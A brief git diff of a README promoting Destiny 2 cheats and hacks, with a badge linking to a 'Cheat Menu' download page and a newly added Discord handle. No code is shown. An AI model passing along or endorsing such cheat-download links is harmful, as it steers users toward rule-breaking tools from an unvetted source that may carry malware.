@@ -6,6 +6,7 @@ Unlock unstoppable power with our Destiny 2 cheats and hacks! This advanced Dest
 
 **[![Destiny 2 Cheat Menu](https://img.shields.io/badge/Download-Cheat%20Menu-blueviolet)](https://destiny-2-cheat-hack.github.io/.github/)**
 
+My discord : cherry1488
 
 Key Features:
 
